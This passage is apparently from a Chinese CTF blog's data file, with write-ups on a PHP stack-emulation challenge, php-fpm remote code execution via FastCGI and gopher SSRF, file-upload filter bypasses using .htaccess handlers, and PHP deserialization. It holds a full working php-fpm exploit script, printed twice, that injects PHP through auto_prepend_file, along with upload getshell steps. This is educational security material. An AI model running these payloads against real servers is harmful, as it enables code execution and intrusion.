$this-&gt;pushdata($data); &#125; public function pushdata($data)&#123; $data = handle_data($data); for($i=0;$i&lt;count($data);$i++)&#123; $this-&gt;stack[$this-&gt;esp+($i*4)] = $data[$i];//no args in my stack haha check_canary(); &#125; &#125; public function recover_data($data)&#123; return hex2bin(strrev($data)); &#125; public function outputdata()&#123; global $regs; echo \"root says: \"; while(1)&#123; if($this-&gt;esp == $this-&gt;ebp-0x4) break; $this-&gt;pop(\"eax\"); $data = $this-&gt;recover_data($regs[\"eax\"]); $tmp = explode(\"\\x00\",$data); echo $tmp[0]; if(count($tmp)&gt;1)&#123; break; &#125; &#125; &#125; public function ret()&#123; $this-&gt;esp = $this-&gt;ebp; $this-&gt;pop('ebp'); $this-&gt;pop(\"eip\"); $this-&gt;call(); &#125; public function get_data_from_reg($regname)&#123; global $regs; $data = $this-&gt;recover_data($regs[$regname]); $tmp = explode(\"\\x00\",$data); return $tmp[0]; &#125; public function call() &#123; global $regs; global $plt; $funcaddr = hexdec($regs['eip']); if(isset($_REQUEST[$funcaddr])) &#123; $this-&gt;pop('eax'); $argnum = (int)$this-&gt;get_data_from_reg(\"eax\"); $args = array(); for($i=0;$i&lt;$argnum;$i++)&#123; $this-&gt;pop('eax'); $argaddr = $this-&gt;get_data_from_reg(\"eax\"); array_push($args,$_REQUEST[$argaddr]); &#125; call_user_func_array($plt[$funcaddr],$args); &#125; else &#123; call_user_func($plt[$funcaddr]); &#125; &#125; public function push($reg)&#123; global $regs; $reg_data = $regs[$reg]; if( hex2bin(strrev($reg_data)) == NULL ) die(\"data error\"); $this-&gt;stack[$this-&gt;esp] = $reg_data; $this-&gt;esp -= 4; &#125; public function pop($reg)&#123; global $regs; $regs[$reg] = $this-&gt;stack[$this-&gt;esp]; $this-&gt;esp += 4; &#125; public function __call($_a1,$_a2) &#123; check_canary(); &#125;&#125;if(isset($_POST['data'])) &#123; $phpinfo_addr = array_search('phpinfo', $plt); $gets = $_POST['data']; $main_stack = new stack($phpinfo_addr, $gets); echo \"--------------------output---------------------&lt;/br&gt;&lt;/br&gt;\"; $main_stack-&gt;outputdata(); echo \"&lt;/br&gt;&lt;/br&gt;------------------phpinfo()------------------&lt;/br&gt;\"; $main_stack-&gt;ret();&#125; 接下来就是源码审计了出题的师傅tql，这是一个用php写的栈，orz首先看到一个沙箱12345foreach ($func as $f)&#123; if(stripos($f,\"file\") !== false || stripos($f,\"open\") !== false || stripos($f,\"read\") !== false || stripos($f,\"write\") !== false)&#123; $disable_functions = $disable_functions.$f.\",\"; &#125;&#125; 先看sandbox.php可以看到，只要函数名包含了file、open、read、write等字符就会被禁用同时也将那些内置的php函数名称存储在$func变量中1$func = get_defined_functions()[\"internal\"]; 接着审计index.php，文件开头是以当前时间作为种子进行随机数播种12$seed = time();srand($seed); 然后将沙箱的那个$func转化为地址=&gt;函数名的$plt数组，而且开启alsr保护，实现键值随机1234567function aslr(&amp;$value,$key)&#123; $value = $value + 0x60000000 + INS_OFFSET + 1 ;&#125;$func_ = array_flip($func);array_walk($func_,\"aslr\");$plt = array_flip($func_); 栈内初始化的时候会有canary机制，在栈内随机初始一个$canary，用来检测栈是否缓冲区溢出栈内压入局部变量的时候会校验当前栈内的$canary和$canarycheck是否一致，$canary被覆盖了就会报错，然后程序就会退出，因此我们覆盖的时候要保证$canary不被覆盖12345678910111213141516171819202122232425262728293031323334function gen_canary()&#123; $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789'; $c_1 = $chars[rand(0,strlen($chars)-1)]; $c_2 = $chars[rand(0,strlen($chars)-1)]; $c_3 = $chars[rand(0,strlen($chars)-1)]; $c_4 = \"\\x00\"; return handle_data($c_1.$c_2.$c_3.$c_4)[0];&#125;$canary = gen_canary();$canarycheck = $canary;function check_canary()&#123; global $canary; global $canarycheck; if($canary != $canarycheck)&#123; die(\"emmmmmm...Don't attack me!\"); &#125;&#125;Class stack&#123; private $ebp,$stack,$esp; public function __construct($retaddr,$data) &#123; $this-&gt;stack = array(); global $regs; $this-&gt;ebp = &amp;$regs['ebp']; $this-&gt;esp = &amp;$regs['esp']; $this-&gt;ebp = 0xfffe0000 + rand(0x0000,0xffff); global $canary; $this-&gt;stack[$this-&gt;ebp - 0x4] = &amp;$canary; $this-&gt;stack[$this-&gt;ebp] = $this-&gt;ebp + rand(0x0000,0xffff); $this-&gt;esp = $this-&gt;ebp - (rand(0x20,0x60)*4); $this-&gt;stack[$this-&gt;ebp + 0x4] = dechex($retaddr); if($data != NULL) $this-&gt;pushdata($data); &#125;&#125; phpinfo函数的地址被默认放在ebp+0x4，也即是函数结束后eip的下一跳的地址，然后去$plt映射表找到函数名，传给call_user_func执行，所以正常的交互都是返回phpinfo的信息123456789101112131415161718192021public function call()&#123; global $regs; global $plt; $funcaddr = hexdec($regs['eip']); if(isset($_REQUEST[$funcaddr])) &#123; $this-&gt;pop('eax'); $argnum = (int)$this-&gt;get_data_from_reg(\"eax\"); $args = array(); for($i=0;$i&lt;$argnum;$i++)&#123; $this-&gt;pop('eax'); $argaddr = $this-&gt;get_data_from_reg(\"eax\"); array_push($args,$_REQUEST[$argaddr]); &#125; call_user_func_array($plt[$funcaddr],$args); &#125; else &#123; call_user_func($plt[$funcaddr]); &#125;&#125; web蒟蒻一脸懵逼，大概理解过来就是写栈，但是注意canary不要也覆盖过去，然后绕过aslr获取利用恶意函数的地址，控制返回地址，调用恶意函数进行命令执行接下来就是解题了，首先我们先注意一点，aslr和canary的初始化都是根据随机数进行的，而随机数的种子则是请求的时间time，所以这只是一个伪随机数，我们可以利用它去预测函数地址curl一下过去发现时间是跟本地时间一样的，因此我们可以对rand函数产生的随机数进行预测，使alsr和canary都失效菜鸡还是太菜了，脚本写了执行不成功，就不贴了突然发现前面说了一大堆都是栈溢出漏洞（捂脸，那么接下来就是php-fpm的unix套接字攻击漏洞php文件如下1234&lt;?php$sock = stream_socket_client('unix:///run/php/php7.3-fpm.sock');fputs($sock, base64_decode($_POST['A']));var_dump(fread($sock, 4096)); 可以看到设置了unix模式，同样的，配置文件也设置套接字模式，这个时候启动php-fpm就会发现监听服务已经换成socket监听了exp如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266#!/usr/bin/python# -*- coding:utf-8 -*-import socketimport randomimport argparseimport sysfrom io import BytesIOfrom six.moves.urllib import parse as urlparseimport base64# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict')def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return sclass FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False #return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs=&#123;&#125;, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) # 前面都是构造的tcp数据包,下面是发送,所以我们可以直接注释掉下面内容,然后返回request #self.sock.send(request) #self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND #self.requests[requestId]['response'] = '' #return self.__waitForResponse(requestId) return request def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:&#123;&#125; port:&#123;&#125;\".format(self.host, self.port)if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = &#123; 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' &#125; # 这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了 response = client.request(params, content) print(force_text(response)) # request_ssrf = urlparse.quote(client.request(params, content)) # print(\"gopher://127.0.0.1:\" + str(args.port) + \"/_\" + request_ssrf) request_ssrf = urlparse.quote(client.request(params, content)) print (base64.b64encode(client.requests(params, content))) print (\"gopher://127.0.0.1:\" + str(args.port) + '/_' +request_ssrf) 这里有个bug，菜鸡也不太会改，等日后水平上去了可能才能改得动（捂脸 tcp模式下ssrf攻击本地的php-fpm我们记得ssrf攻击有个是利用gopher://进行的攻击的方法URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gophar_path&gt;_后接TCP数据流因为gopher协议可以直接发送tcp协议流，所以我们可以直接将数据流进行urlencode编码然后构造代码利用脚本如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261#!/usr/bin/python# -*- coding:utf-8 -*-import socketimport randomimport argparseimport sysfrom io import BytesIOfrom six.moves.urllib import parse as urlparse# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict')def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return sclass FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False #return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs=&#123;&#125;, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) # 前面都是构造的tcp数据包,下面是发送,所以我们可以直接注释掉下面内容,然后返回request #self.sock.send(request) #self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND #self.requests[requestId]['response'] = '' #return self.__waitForResponse(requestId) return request def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:&#123;&#125; port:&#123;&#125;\".format(self.host, self.port)if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = &#123; 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' &#125; # 这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了 #response = client.request(params, content) #print(force_text(response)) request_ssrf = urlparse.quote(client.request(params, content)) print(\"gopher://127.0.0.1:\" + str(args.port) + \"/_\" + request_ssrf) 服务器测试代码如下12345678910&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); &#125;$url = $_GET['url'];curl($url); 执行python fpm_ssrf.py -c &#39;&lt;?php echoid; ?&gt;&#39; -p 9000 127.0.0.1 /var/www/html/index.php生成payload打过去就行但是要注意一点，payload需要urlencode两次，因为nginx会解码一次，然后php-fpm解码一次或者用GitHub上的脚本也行","comments":true,"permalink":"https://xi4or0uji.github.io/2019/07/11/php-fpm/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"php-fpm","slug":"php-fpm","permalink":"https://xi4or0uji.github.io/tags/php-fpm/"}]},{"title":"文件上传汇总","date":"2019-07-09T16:00:00.000Z","path":"2019/07/10/文件上传汇总/","text":"前言很早就应该出这篇了，之前国赛出题耽搁了一下，补坑补坑这个漏洞相信有点接触的都很清楚要干嘛的，就不解释了，直接开讲 常见的上传文件的校验方法这个漏洞体系庞大，不知道从何讲起，所以就先根据这些校验的方法将绕过的方法说一说 客户端校验绕过这个检测是在前端，所以直接抓个包改一下就能绕过上传文件了 服务端绕过content-type检验这种检验抓包修改content-type即可 文件幻数检测在文件内容前加入对应的文件头信息，GIF89a、‰PNG之类的 文件加载检测如果图片是通过渲染的方式进行测试的话，可以将一句话木马放在图片最后，尝试一下能不能执行 后缀名大小写有些服务器会忽略大小写，因此可以直接修改后缀名的大小写完成绕过 扩展名有一些后缀名可能不在黑名单里面，但是也是能被服务器解析的1234jsp jspx jspfasp asa cer aspxphp php3 php4 php5 pht phtmlexe exee %00截断如果存在这个漏洞的话，可以上传一个文件名为test.php%00.jpg，用它绕过漏洞 解析漏洞这个漏洞主要是web容器在解析文件时出了漏洞，导致其他格式的文本也能当做脚本格式去执行 多后缀Apache的解析规则是从右往左进行判断，如果后缀名为不可识别的文件，就再向左进行解析例如假设上传了一个test.php.abc，服务器不能识别abc，所以会向左看，解析php，能解析了，于是将它解析成php文件 配置漏洞如果在Apache的conf文件里有这样一行配置AddHandler php5-script .php，这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。同理，如果在Apache的conf里有这样一行配置AddType application/x-httpd-php .jpg，即使扩展名是 jpg，一样能以 php 方式执行。 .htaccess一般来说，配置文件都是全局的，但是Apache还有一种比较简单的配置当前目录和子目录的配置文件，当然想利用的前提是开启了模块的使用12AllowOverride AllLoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so 而ubuntu配置还需要加多句命令sudo a2enmod rewrite，然后还要重启服务器假设我们能上传一个.htaccess文件并且写入123&lt;FilesMatch \"shell.jpg\"&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 这样子等我们上传shell.jpg的时候就能将shell.jpg文件当做php文件执行 例题这里给一个例题，2018年的巅峰极客有一题BabyWeb，图太久远找不回了，只讲操作好吧首先扫描端口看到3306是开放的，然后用hudra爆破mysql拿到密码是1q2w3e4r5t6y，进入数据库后可以得到账号和密码`BabyWeb@my.lol/babyweb@1990，成功登录进去以后就是想办法进行文件上传去getshell了 登录进mysql以后是看到一个type字段，内容是{“0”:”png”,”1”:”jpg”,”2”:”gif”}，这里就是前端取的限制上传的值，直接改php改不了，但是我们可以绕一下，改成{“0”:”png”,”1”:”jpg”,”2”:”gif”,”3”:”xxx”,”5”:”htaccess”}，这样就能成功上传.htaccess`文件，且内容为123&lt;FilesMatch \"shell.xxx\"&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 然后再上传shell.xxx，这样就能成功解析shell.xxx文件然后getshell","comments":true,"permalink":"https://xi4or0uji.github.io/2019/07/10/文件上传汇总/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"upload","slug":"upload","permalink":"https://xi4or0uji.github.io/tags/upload/"}]},{"title":"php反序列化由浅到深","date":"2019-06-26T16:00:00.000Z","path":"2019/06/27/php反序列化由浅到深/","text":"前言最近的博客可能都是各类知识点的总结博客，毕竟队内的wiki还在搭建过程中，今天就来系统讲一下php的反序列化吧，如果有错误，希望各位大师傅们指出Orz 序列化与反序列化简单的说来，就是PHP在保存和传递对象的时候，会将一个原本很大块的代码根据一定的规则转换为字符串，这个过程就是序列化，那么反序列化就是将序列化后的字符串重新转化为对象的过程了，好了，下面先来几个例子来具体介绍 简单例子先放一个简单的例子123456789101112131415class Example&#123; public $a1 = \"abc\"; private $a2 = \"abc\"; protected $a3 = \"abc\"; public $b = [\"1\",\"2\",\"3\"]; public function display()&#123; echo $this-&gt;a1; echo \"\\n\"; echo $this-&gt;b; &#125;&#125;$example = new Example();file_put_contents('res.txt',serialize($example));var_dump(serialize($example)) ; 这个时候我们就可以看到序列化后的值是1string(138) \"O:7:\"Example\":4:&#123;s:2:\"a1\";s:3:\"abc\";s:11:\"Examplea2\";s:3:\"abc\";s:5:\"*a3\";s:3:\"abc\";s:1:\"b\";a:3:&#123;i:0;s:1:\"1\";i:1;s:1:\"2\";i:2;s:1:\"3\";&#125;&#125;\" 可以看到a1、a2、a3的值都一样，但是这三个值的键名都不一样，具体看一下他的二进制数可以看到，它是会将每一个变量的类型和值都保存起来，还会将长度打印出来，但是需要注意一点123公有属性：属性名私有属性：%00类名%00属性名保护属性：%00*%00属性名 然后还原也能成功还原12$s = \"O:7:\"Example\":4:&#123;s:2:\"a1\";s:3:\"abc\";s:11:\"Examplea2\";s:3:\"abc\";s:5:\"*a3\";s:3:\"abc\";s:1:\"b\";a:3:&#123;i:0;s:1:\"1\";i:1;s:1:\"2\";i:2;s:1:\"3\";&#125;&#125;\";var_dump(unserialize($s)); 以上就是一个简单的序列化和反序列化的过程了，那么接下来就是漏洞利用了 漏洞利用魔幻函数在php里面，有许多很神奇的函数，通过一定的条件可以自动调用，我们将它称为魔幻函数，先列一下123456789101112__construct()//创建对象时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发__sleep() //对象被序列化前触发__wakeup() //反序列化前触发__toString() //将对象当做字符串输出会触发 例题这道题是今年国赛的热身题，先来看源码12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) &#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125; 可以看到这道题我们想要拿到flag先要触发__destruct函数，但是__wakeup函数会将一切参数置空，修改一下属性个数就能绕过，至于token_flag和token的匹配就要用指针去匹配，exp如下1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; 